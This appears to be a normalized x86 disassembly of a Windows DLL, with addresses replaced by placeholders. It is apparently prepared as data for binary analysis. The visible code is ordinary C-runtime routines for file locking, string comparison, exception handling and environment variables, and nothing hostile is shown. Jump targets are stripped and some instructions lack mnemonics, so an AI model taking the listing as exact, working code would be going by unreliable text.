mov [ eax ] esi
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_100188d8
push 0xc
push r--data
call sub_10012000
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001896f
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016222
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10018978
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001899f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1001129f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_10010e15
push esi
mov ebx eax
call sub_10019ae6
push esi
call sub_10015fc1
push eax
call sub_10019a19
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_1000fe7d
pop ecx
mov [ esi + 0x1c ] edi
sub_10018a16
push 0xc
push r--data
call sub_10012000
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1001129f
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10011079
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_1001899f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018a8a
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_10012045
retn
mov eax [ ebp - 0x1c ]
sub_10018a94
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10018ab4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000fe6e
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10018af9
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10018af9
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10018ab4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10018ba9
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10018bc8
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10018ba9
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10018bd4
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_1001680b
test eax eax
je r-xdata
push 0xa
call sub_100124ff
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10016818
pop ecx
push 0x3
call sub_1001248c
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_10010a00
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_10018d01
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10010400
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10010400
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10019d80
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_10018df3
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018d01
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1001129f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_10019d80
sub_10018e51
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10018e90
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_10018ed0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10018f8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_10010024
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018df3
add esp 0xc
cmp [ ebp - 0x8 ] bl
je r-xdata
pop ebx
leave
retn
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
push esi
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
mov dl [ edi ]
cmp dl bl
jne r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
mov si cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
mov [ ebp - 0x4 ] ecx
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x4 ]
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0xc ]
movzx ecx cx
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov ecx [ ebp + 0xc ]
movzx cx [ ecx ]
inc [ ebp + 0xc ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp si bx
je r-xdata
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
mov cx [ ebp - 0x4 ]
add si [ eax + 0x1a ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
movzx cx [ edi ]
dec [ ebp + 0x10 ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_10019170
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_1001918e
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_10019170
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_10019170
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_10017745
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_1001778e
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_1000fe7d
push edi
call sub_1000fe7d
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_1001778e
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_1000fe7d
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_10013d7f
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_1000ff5a
pop ecx
test eax eax
je r-xdata
call sub_10017950
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_10013d7f
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_1000ff5a
pop ecx
test eax eax
je r-xdata
call sub_10017950
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_100194fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001918e
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10019540
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10010024
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_100194fe
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018d01
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1001129f
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001963a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_1001828d
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1001968c
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_10013c93
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_1001221c
jmp r-xdata
push eax
call sub_10019de1
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_100196e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1001129f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1001129f
mov [ eax ] 0x16
push 0x3d
push esi
call sub_10017ba0
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1001968c
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1001963a
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_10013c4e
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_100182a7
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000fe7d
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_1000fe7d
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_10013c4e
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_10013d2d
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_10013d2d
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10016180
inc eax
pop ecx
inc eax
push eax
call sub_10013c93
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000fe7d
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
